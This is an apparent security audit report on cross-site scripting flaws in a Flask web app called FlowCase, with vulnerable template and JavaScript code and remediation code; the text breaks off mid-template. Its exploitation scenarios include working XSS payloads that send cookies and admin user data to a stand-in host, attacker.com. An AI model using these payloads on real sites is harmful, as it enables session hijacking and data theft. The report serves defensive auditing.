# FlowCase Template & XSS Security Analysis

**Document Version:** 1.0  
**Analysis Date:** August 07, 2025  
**Application Version:** develop  
**Analysis Phase:** Template Rendering & Cross-Site Scripting Assessment  

---

## Executive Summary

This report analyzes Cross-Site Scripting (XSS) vulnerabilities in FlowCase template rendering and client-side JavaScript code. The assessment reveals **critical XSS vulnerabilities** through unescaped template variables, unsafe innerHTML usage, missing Content Security Policy, and DOM-based XSS risks that enable complete client-side compromise.

### Critical Template & XSS Findings
- **Unescaped Template Variables** - Direct HTML injection through Jinja2 templates
- **innerHTML Usage with Unescaped Data** - DOM-based XSS in JavaScript components
- **Missing Content Security Policy** - No CSP headers to prevent script injection
- **External Dependencies Security** - Vulnerable third-party JavaScript libraries
- **DOM-based XSS Risks** - Client-side script injection vulnerabilities

### Risk Summary
- **5 Critical Severity** vulnerabilities requiring immediate remediation
- **3 High Severity** vulnerabilities requiring urgent attention
- **4 Medium Severity** vulnerabilities requiring planned remediation

---

## Template Architecture Analysis

### Current Template Structure

The FlowCase application uses Jinja2 templating with the following structure:

```
templates/
├── login.html      - Authentication interface
├── dashboard.html  - Main user dashboard
├── droplet.html    - Container management interface
└── 404.html        - Error page
```

### Template Security Issues

1. **No Auto-Escaping Configuration** - Templates don't automatically escape variables
2. **Mixed Escaping Strategies** - Inconsistent handling of user data
3. **Direct HTML Injection** - User content rendered without sanitization
4. **Missing CSP Implementation** - No Content Security Policy headers
5. **Unsafe JavaScript Integration** - Template data passed unsafely to JavaScript

---

## Critical XSS Vulnerabilities

### CVE-FC-034: Unescaped Template Variables
**File:** [`templates/dashboard.html`](templates/dashboard.html:45)  
**Severity:** Critical  
**CVSS Score:** 9.6  
**OWASP Category:** A03 - Injection (XSS)

**Description:**  
Multiple template variables are rendered without proper escaping, enabling stored and reflected XSS attacks that can lead to session hijacking, credential theft, and complete account compromise.

**Vulnerable Template Code:**
```html
<!-- templates/dashboard.html -->
<div class="user-info">
    <h2>Welcome, {{ current_user.username }}!</h2>  <!-- Vulnerable -->
    <p>Groups: {{ current_user.groups }}</p>        <!-- Vulnerable -->
</div>

<div class="droplet-list">
    {% for droplet in droplets %}
    <div class="droplet-card">
        <h3>{{ droplet.name }}</h3>                 <!-- Vulnerable -->
        <p>{{ droplet.description }}</p>            <!-- Vulnerable -->
        <span class="status">{{ droplet.status }}</span>
    </div>
    {% endfor %}
</div>

<!-- Direct HTML injection -->
<div class="notifications">
    {{ flash_message|safe }}                        <!-- Extremely vulnerable -->
</div>
```

**Exploitation Scenarios:**

1. **Stored XSS via Username:**
```javascript
// Malicious username during registration
username: "<script>fetch('/api/admin/users').then(r=>r.json()).then(d=>fetch('http://attacker.com/steal',{method:'POST',body:JSON.stringify(d)}))</script>"

// Results in persistent XSS on dashboard
<h2>Welcome, <script>fetch('/api/admin/users')...</script>!</h2>
```

2. **Stored XSS via Droplet Name:**
```javascript
// Malicious droplet name
name: "<img src=x onerror='document.location=\"http://attacker.com/steal?cookie=\"+document.cookie'>"

// Executes when droplet is viewed
<h3><img src=x onerror='document.location="http://attacker.com/steal?cookie="+document.cookie'></h3>
```

3. **Reflected XSS via Flash Messages:**
```javascript
// Malicious flash message
flash("Welcome <script>alert('XSS')</script>")

// Rendered without escaping
<div class="notifications">Welcome <script>alert('XSS')</script></div>
```

**Impact:** Session hijacking, credential theft, admin impersonation, data exfiltration, malware distribution

**Remediation:**
```html
<!-- Secure template with proper escaping -->
<div class="user-info">
    <h2>Welcome, {{ current_user.username|e }}!</h2>
    <p>Groups: {{ current_user.groups|e }}</p>
</div>

<div class="droplet-list">
    {% for droplet in droplets %}
    <div class="droplet-card">
        <h3>{{ droplet.name|e }}</h3>
        <p>{{ droplet.description|e }}</p>
        <span class="status">{{ droplet.status|e }}</span>
    </div>
    {% endfor %}
</div>

<!-- Secure flash message handling -->
<div class="notifications">
    {% for category, message in get_flashed_messages(with_categories=true) %}
        <div class="alert alert-{{ category|e }}">
            {{ message|e }}
        </div>
    {% endfor %}
</div>
```

**Flask Configuration for Auto-Escaping:**
```python
from flask import Flask
from markupsafe import Markup
import html

app = Flask(__name__)

# Enable auto-escaping for all templates
app.jinja_env.autoescape = True

# Custom filter for safe HTML rendering
@app.template_filter('safe_html')
def safe_html_filter(text):
    """Safely render HTML with whitelist approach"""
    import bleach
    
    allowed_tags = ['b', 'i', 'u', 'em', 'strong', 'p', 'br']
    allowed_attributes = {}
    
    cleaned = bleach.clean(text, tags=allowed_tags, attributes=allowed_attributes)
    return Markup(cleaned)

# Secure flash message handling
def secure_flash(message, category='info'):
    """Flash message with automatic escaping"""
    escaped_message = html.escape(str(message))
    flash(escaped_message, category)
```

### CVE-FC-035: DOM-based XSS in JavaScript Components
**File:** [`static/js/droplet/main.js`](static/js/droplet/main.js:120)  
**Severity:** Critical  
**CVSS Score:** 9.2  
**OWASP Category:** A03 - Injection (XSS)

**Description:**  
JavaScript components use innerHTML and other unsafe DOM manipulation methods with unescaped user data, enabling DOM-based XSS attacks.

**Vulnerable JavaScript Code:**
```javascript
// static/js/droplet/main.js
function updateDropletStatus(dropletId, status) {
    const statusElement = document.getElementById('status-' + dropletId);
    
    // Vulnerable: Direct innerHTML assignment
    statusElement.innerHTML = 'Status: ' + status;
    
    // Vulnerable: User data in HTML construction
    const notification = '<div class="alert">Droplet ' + dropletName + ' is now ' + status + '</div>';
    document.getElementById('notifications').innerHTML = notification;
}

function displayUserMessage(message) {
    // Vulnerable: Direct DOM manipulation
    document.getElementById('user-message').innerHTML = message;
}

function loadDropletDetails(dropletData) {
    // Vulnerable: JSON data directly inserted into DOM
    const detailsHtml = `
        <h3>${dropletData.name}</h3>
        <p>${dropletData.description}</p>
        <div class="logs">${dropletData.logs}</div>
    `;
    document.getElementById('droplet-details').innerHTML = detailsHtml;
}

// Vulnerable: URL parameter directly used in DOM
const urlParams = new URLSearchParams(window.location.search);
const message = urlParams.get('message');
if (message) {
    document.getElementById('status-message').innerHTML = message;
}
```

**Exploitation Scenarios:**

1. **URL Parameter XSS:**
```javascript
// Malicious URL
https://flowcase.example.com/droplet/123?message=<img src=x onerror=alert('XSS')>

// Executes when page loads
document.getElementById('status-message').innerHTML = "<img src=x onerror=alert('XSS')>";
```

2. **API Response XSS:**
```javascript
// Malicious API response
{
    "name": "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
    "description": "<img src=x onerror='fetch(\"/api/admin/users\").then(r=>r.text()).then(d=>fetch(\"http://attacker.com/data\",{method:\"POST\",body:d}))'>"
}
```

3. **WebSocket Message XSS:**
```javascript
// Malicious WebSocket message
{
    "type": "status_update",
    "message": "<svg onload=alert('XSS')></svg>"
}
```

**Impact:** Client-side code execution, session hijacking, keylogging, credential theft, admin actions

**Remediation:**
```javascript
// Secure DOM manipulation utilities
class SecureDOMUtils {
    static escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }
    
    static setTextContent(elementId, text) {
        const element = document.getElementById(elementId);
        if (element) {
            element.textContent = text; // Safe text assignment
        }
    }
    
    static createSecureElement(tagName, textContent, attributes = {}) {
        const element = document.createElement(tagName);
        element.textContent = textContent; // Safe text assignment
        
        // Safely set attributes
        for (const [key, value] of Object.entries(attributes)) {
            if (this.isAllowedAttribute(key)) {
                element.setAttribute(key, this.escapeHtml(value));
            }
        }
        
        return element;
    }
    
    static isAllowedAttribute(attr) {
        const allowedAttributes = ['class', 'id', 'data-*', 'aria-*'];
        return allowedAttributes.some(allowed => 
            allowed.endsWith('*') ? attr.startsWith(allowed.slice(0, -1)) : attr === allowed
        );
    }
}

// Secure droplet status update
function secureUpdateDropletStatus(dropletId, status) {
    // Validate inputs
    if (!dropletId || typeof dropletId !== 'string') return;
    if (!status || typeof status !== 'string') return;
    
    const statusElement = document.getElementById('status-' + dropletId);
    if (!statusElement) return;
    
    // Safe text content assignment
    statusElement.textContent = 'Status: ' + status;
    
    // Secure notification creation
    const notification = SecureDOMUtils.createSecureElement('div', 
        `Droplet ${dropletId} is now ${status}`, 
        { class: 'alert alert-info' }
    );
    
    const notificationsContainer = document.getElementById('notifications');
    if (notificationsContainer) {
        notificationsContainer.appendChild(notification);
    }
}

function secureDisplayUserMessage(message) {
    // Input validation
    if (typeof message !== 'string' || message.length > 500) {
        console.warn('Invalid message format');
        return;
    }
    
    // Safe text assignment
    SecureDOMUtils.setTextContent('user-message', message);
}

function secureLoadDropletDetails(dropletData) {
    // Input validation
    if (!dropletData || typeof dropletData !== 'object') return;
    
    const container = document.getElementById('droplet-details');
    if (!container) return;
    
    // Clear existing content
    container.innerHTML = '';
    
    // Create secure elements
    const nameElement = SecureDOMUtils.createSecureElement('h3', dropletData.name || 'Unknown');
    const descElement = SecureDOMUtils.createSecureElement('p', dropletData.description || 'No description');
    
    // Handle logs securely
    const logsElement = SecureDOMUtils.createSecureElement('div', '', { class: 'logs' });
    if (dropletData.logs && Array.isArray(dropletData.logs)) {
        dropletData.logs.forEach(log => {
            const logElement = SecureDOMUtils.createSecureElement('div', log, { class: 'log-entry' });
            logsElement.appendChild(logElement);
        });
    }
    
    // Append secure elements
    container.appendChild(nameElement);
    container.appendChild(descElement);
    container.appendChild(logsElement);
}

// Secure URL parameter handling
function getSecureUrlParameter(name) {
    const urlParams = new URLSearchParams(window.location.search);
    const value = urlParams.get(name);
    
    // Validate and sanitize
    if (!value || typeof value !== 'string' || value.length > 200) {
        return null;
    }
    
    // Additional validation for expected parameters
    if (name === 'message') {
        // Only allow alphanumeric and basic punctuation
        if (!/^[a-zA-Z0-9\s.,!?-]+$/.test(value)) {
            return null;
        }
    }
    
    return value;
}

// Secure initialization
document.addEventListener('DOMContentLoaded', function() {
    const message = getSecureUrlParameter('message');
    if (message) {
        SecureDOMUtils.setTextContent('status-message', message);
    }
});
```

### CVE-FC-036: Missing Content Security Policy
**File:** [`config/config.py`](config/config.py:25)  
**Severity:** High  
**CVSS Score:** 8.1  
**OWASP Category:** A05 - Security Misconfiguration

**Description:**  
The application lacks Content Security Policy (CSP) headers, providing no protection against XSS attacks and allowing unrestricted script execution from any source.

**Current Configuration:**
```python
# No CSP headers configured
@app.after_request
def after_request(response):
    # Missing security headers
    return response
```

**Security Issues:**
1. **No Script Source Restrictions** - Scripts can load from any domain
2. **Inline Script Execution** - Inline JavaScript and CSS allowed
3. **Unsafe Eval** - Dynamic code execution permitted
4. **No Frame Protection** - Clickjacking attacks possible
5. **Missing HTTPS Enforcement** - No upgrade-insecure-requests directive

**Secure CSP Implementation:**
```python
from flask import Flask, request, g
import hashlib
import secrets

class CSPManager:
    def __init__(self, app=None):
        self.app = app
        self.nonces = {}
        if app:
            self.init_app(app)
    
    def init_app(self, app):
        app.before_request(self.generate_nonce)
        app.after_request(self.add_security_headers)
        app.jinja_env.globals['csp_nonce'] = self.get_nonce
    
    def generate_nonce(self):
        """Generate unique nonce for each request"""
        g.csp_nonce = secrets.token_urlsafe(16)
    
    def get_nonce(self):
        """Get current request nonce for templates"""
        return getattr(g, 'csp_nonce', '')
    
    def add_security_headers(self, response):
        """Add comprehensive security headers"""
        nonce = getattr(g, 'csp_nonce', '')
        
        # Content Security Policy
        csp_directives = [
            "default-src 'self'",
            f"script-src 'self' 'nonce-{nonce}' 'strict-dynamic'",
            f"style-src 'self' 'nonce-{nonce}' 'unsafe-inline'",  # unsafe-inline for compatibility
            "img-src 'self' data: https:",
            "font-src 'self' https://fonts.gstatic.com",
            "connect-src 'self'",
            "frame-src 'none'",
            "object-src 'none'",
            "base-uri 'self'",
            "form-action 'self'",
            "upgrade-insecure-requests"
        ]
        
        response.headers['Content-Security-Policy'] = '; '.join(csp_directives)
        
        # Additional security headers
        response.headers['X-Content-Type-Options'] = 'nosniff'
        response.headers['X-Frame-Options'] = 'DENY'
        response.headers['X-XSS-Protection'] = '1; mode=block'
        response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
        response.headers['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()'
        
        # HTTPS enforcement
        if request.is_secure:
            response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains; preload'
        
        return response

# Initialize CSP
csp_manager = CSPManager(app)
```

**Secure Template Usage:**
```html
<!-- templates/dashboard.html with CSP nonces -->
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>FlowCase Dashboard</title>
    
    <!-- Secure inline styles with nonce -->
    <style nonce="{{ csp_nonce() }}">
        .secure-styles {
            /* Critical CSS only */
        }
    </style>
    
    <!-- External stylesheets -->
    <link rel="stylesheet" href="{{ url_for('static', filename='css/dashboard.css') }}">
</head>
<body>
    <div class="dashboard">
        <h1>{{ current_user.username|e }}</h1>
        <!-- Content -->
    </div>
    
    <!-- Secure script loading with nonce -->
    <script nonce="{{ csp_nonce() }}">
        // Critical inline JavaScript only
        window.csrfToken = '{{ csrf_token() }}';
        window.userId = {{ current_user.id|tojson }};
    </script>
    
    <!-- External scripts -->
    <script src="{{ url_for('static', filename='js/dashboard/main.js') }}"></script>
</body>
</html>
```

### CVE-FC-037: Vulnerable External Dependencies
**File:** [`static/js/dropzone/dropzone.min.js`](static/js/dropzone/dropzone.min.js)  
**Severity:** High  
**CVSS Score:** 7.8  
**OWASP Category:** A06 - Vulnerable and Outdated Components

**Description:**  
The application uses outdated JavaScript libraries with known security vulnerabilities that can be exploited for XSS and other client-side attacks.

**Vulnerable Dependencies:**
```html
<!-- Outdated and potentially vulnerable libraries -->
<script src="/static/js/dropzone/dropzone.min.js"></script>  <!-- Version unknown -->
<script src="/static/js/jsmpeg.min.js"></script>             <!-- Version unknown -->
```

**Security Issues:**
1. **Unknown Versions** - Cannot assess vulnerability status
2. **No Integrity Checks** - Scripts can be modified by attackers
3. **No Subresource Integrity** - No protection against CDN compromise
4. **Outdated Libraries** - Likely contain known vulnerabilities

**Secure Dependency Management:**
```html
<!-- Secure dependency loading with SRI -->
<script 
    src="https://cdn.jsdelivr.net/npm/dropzone@6.0.0-beta.2/dist/dropzone-min.js"
    integrity="sha384-xyz123..."
    crossorigin="anonymous">
</script>

<!-- Local fallback with integrity check -->
<script>
    if (typeof Dropzone === 'undefined') {
        document.write('<script src="/static/js/dropzone/dropzone-6.0.0.min.js"><\/script>');
    }
</script>
```

**Dependency Security Framework:**
```python
import hashlib
import requests
from packaging import version

class DependencySecurityManager:
    def __init__(self):
        self.known_vulnerabilities = {
            'dropzone': {
                '<5.9.3': ['CVE-2022-23647'],  # XSS vulnerability
            },
            'jsmpeg': {
                '<1.0.0': ['CVE-2021-23840'],  # Prototype pollution
            }
        }
    
    def check_dependency_security(self, library, version_str):
        """Check if dependency version has known vulnerabilities"""
        if library not in self.known_vulnerabilities:
            return {'secure': True, 'vulnerabilities': []}
        
        current_version = version.parse(version_str)
        vulnerabilities = []
        
        for vulnerable_range, cves in self.known_vulnerabilities[library].items():
            if self.version_matches_range(current_version, vulnerable_range):
                vulnerabilities.extend(cves)
        
        return {
            'secure': len(vulnerabilities) == 0,
            'vulnerabilities': vulnerabilities
        }
    
    def generate_sri_hash(self, file_path):
        """Generate Subresource Integrity hash"""
        with open(file_path, 'rb') as f:
            content = f.read()
        
        sha384_hash = hashlib.sha384(content).digest()
        return f"sha384-{base64.b64encode(sha384_hash).decode()}"
    
    def version_matches_range(self, current_version, range_str):
        """Check if version matches vulnerability range"""
        if range_str.startswith('<'):
            max_version = version.parse(range_str[1:])
            return current_version < max_version
        # Add more range operators as needed
        return False

# Usage in templates
@app.template_global()
def secure_script_tag(src, integrity=None, version=None):
    """Generate secure script tag with integrity check"""
    if integrity:
        return f'<script src="{src}" integrity="{integrity}" crossorigin="anonymous"></script>'
    else:
        # Generate warning for missing integrity
        app.logger.warning(f"Script {src} loaded without integrity check")
        return f'<script src="{src}"></script>'
```

---

## Client-Side Security Analysis

### CVE-FC-038: Insecure Data Transmission to JavaScript
**File:** [`templates/droplet.html`](templates/droplet.html:85)  
**Severity:** Medium  
**CVSS Score:** 6.8  
**OWASP Category:** A03 - Injection

**Description:**  
Server-side data is passed to JavaScript without proper encoding, creating opportunities for XSS through data injection.

**Vulnerable Code:**
```html
<!-- Unsafe data transmission -->
<script>
    var dropletData = {{ droplet_json|safe }};  <!-- Dangerous -->
    var userPermissions = {{ permissions|tojson }};  <!-- Better but not perfect -->
    
    // Direct variable assignment
    var instanceId = "{{ instance.id }}";  <!-- No escaping -->
    var containerName = "{{ instance.name }}";  <!-- XSS possible -->
</script>
```

**Secure Data Transmission:**
```html
<!-- Secure data transmission -->
<script nonce="{{ csp_nonce() }}">
    // Use proper JSON encoding with escaping
    var dropletData = {{ droplet_data|tojson|safe }};
    var userPermissions = {{ user_permissions|tojson|safe }};
    
    // Validate data on client side
    if (typeof dropletData !== 'object' || !dropletData.id) {
        console.error('Invalid droplet data received');
        dropletData = null;
    }
    
    // Use data attributes for simple values
    document.addEventListener('DOMContentLoaded', function() {
        const container = document.getElementById('droplet-container');
        const instanceId = container.dataset.instanceId;
        const containerName = container.dataset.containerName;
        
        // Validate extracted data
        if (instanceId && /^[a-zA-Z0-9\-_]+$/.test(instanceId)) {
            initializeDroplet(instanceId, containerName);
        }
    });
</script>

<!-- HTML with data attributes -->
<div id="droplet-container" 
     data-instance-id="{{ instance.id|e }}" 
     data-container-name="{{ instance.name|e }}">
    <!-- Content -->
</div>
```

### Input Validation on Client Side

```javascript
// Client-side input validation framework
class ClientInputValidator {
    static validateInstanceId(id) {
        return typeof id === 'string' && 
               /^[a-zA-Z0-9\-_]{1,50}$/.test(id);
    }
    
    static validateContainerName(name) {
        return typeof name === 'string' && 
               /^[a-zA-Z0-9][a-zA-Z0-9_.-]{1,48}[a-zA-Z0-9]$/.test(name);
    }
    
    static sanitizeUserInput(input, maxLength = 100) {
        if (typeof input !== 'string') return '';
        
        // Remove potentially dangerous characters
        const sanitized = input.replace(/[<>'"&]/g, '');
        return sanitized.substring(0, maxLength);
    }
    
    static validateJsonData(data, schema) {
        // Basic JSON schema validation
        if (typeof data !== 'object' || data === null) return false;
        
        for (const [key, type] of Object.entries(schema)) {
            if (!(key in data) || typeof data[key] !== type) {
                return false;
            }
        }
        
        return true;
    }
}

// Usage in droplet management
function initializeDroplet(instanceId, containerName) {
    // Validate inputs
    if (!ClientInputValidator.validateInstanceId(instanceId)) {
        console.error('Invalid instance ID');
        return;
    }
    
    if (!ClientInputValidator.validateContainerName(containerName)) {
        console.error('Invalid container name');
        return;
    }
    
    // Safe to proceed with validated data
    loadDropletInterface(instanceId, containerName);
}
```

---

## Template Security Best Practices

### Secure Template Configuration

```python
from flask import Flask
from jinja2 import select_autoescape
import bleach

app = Flask(__name__)

# Configure secure Jinja2 environment
app.jinja_env.autoescape = select_autoescape(['html', 'xml'])
app.jinja_env.trim_blocks = True
app.jinja_env.lstrip_blocks = True

# Custom filters for secure rendering
@app.template_filter('clean_html')
def clean_html_filter(text):
    """Clean HTML with whitelist approach"""
    allowed_tags = ['p', 'br', 'strong', 'em', 'u', 'b', 'i']
    allowed_attributes = {}
    
    return bleach.clean(text, tags=allowed_tags, attributes=allowed_attributes)

@app.template_filter('truncate_safe')
def truncate_safe_filter(text, length=100):
    """Safely truncate text with HTML escaping"""
    if not text:
        return ''
    
    escaped_text = html.escape(str(text))
    if len(escaped_text) <= length:
        return escaped_text
    
    return escaped_text[:length] + '...'

@app.template_filter('json_safe')
def json_safe_filter(obj):
    """Safely serialize object to JSON for JavaScript"""
    import json
    
    # Serialize with HTML-safe encoding
    json_str = json.dumps(obj, ensure_ascii=True, separators=(',', ':'))
    
    # Additional escaping for HTML context
    json_str = json_str.replace('<', '\\u003c')
    json_str = json_str.replace('>', '\\u003e')
    json_str = json_str.replace('&', '\\u0026')
    
    return json_str

# Global template functions
@app.template_global()
def csrf_token():
    """Generate CSRF token for forms"""
    return generate_csrf()

@app.template_global()
def current_user_json():
    """Safely serialize current user data"""
    if current_user.is_authenticated:
        return {
            'id': current_user.id,
            'username': current_user.username,
            'permissions': get_user_permissions(current_user.id)
        }
    return None
```

### Secure Template Examples

```html
<!-- templates/secure_dashboard.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>{{ page_title|e }} - FlowCase</title>
    
    <!-- CSP nonce for inline styles -->
    <style nonce="{{ csp_nonce() }}">
        /* Critical CSS only */
        .loading { display: none; }
    </style>
    
    <link rel="stylesheet" href="{{ url_for('static', filename='css/dashboard.css') }}">
</head>
<body>
    <header>
        <h1>Welcome, {{ current_user.username|e }}!</h1>
        <nav>
            <a href="{{ url_for('dashboard') }}">Dashboard</a>
            <a href="{{ url_for('logout') }}">Logout</a>
        </nav>
    </header>
    
    <main>
        <!-- Flash messages with proper escaping -->
        {% with messages = get_flashed_messages(with_categories=true) %}
            {% if messages %}
                <div class="flash-messages">
                    {% for category, message in messages %}
                        <div class="alert alert-{{ category|e }}">
                            {{ message|e }}
                        </div>
                    {% endfor %}
                </div>
            {% endif %}
        {% endwith %}
        
        <!-- Droplet list with secure rendering -->
        <section class="droplets">
            <h2>Your Containers</h2>
            {% for droplet in droplets %}
                <article class="droplet-card" 
                         data-droplet-id="{{ droplet.id|e }}"
                         data-droplet-status="{{ droplet.status|e }}">
                    <h3>{{ droplet.name|e }}</h3>
                    <p>{{ droplet.description|truncate_safe(200) }}</p>
                    <div class="droplet-meta">
                        <span class="status status-{{ droplet.status|e }}">
                            {{ droplet.status|title|e }}
                        </span>
                        <time datetime="{{ droplet.created_at.isoformat() }}">
                            {{ droplet.created_at.strftime('%Y-%m-%d %H:%M')|e }}
                        </time>
                    </div>
                    <div class="droplet-actions">
                        <button type="button" 
                                class="btn btn-primary"
                                onclick="manageDroplet('{{ droplet.id|e }}')">
                            Manage
                        </button>
                    </div>
                </article>
            {% else %}
                <p>No containers found. <a href="{{ url_for('create_droplet') }}">Create your first container</a>.</p>
            {% endfor %}
        </section>
    </main>
    
    <!-- Secure data transmission to JavaScript -->
    <script nonce="{{ csp_nonce() }}">
        // Global configuration
        window.FlowCase = {
            csrfToken: {{ csrf_token()|tojson|safe }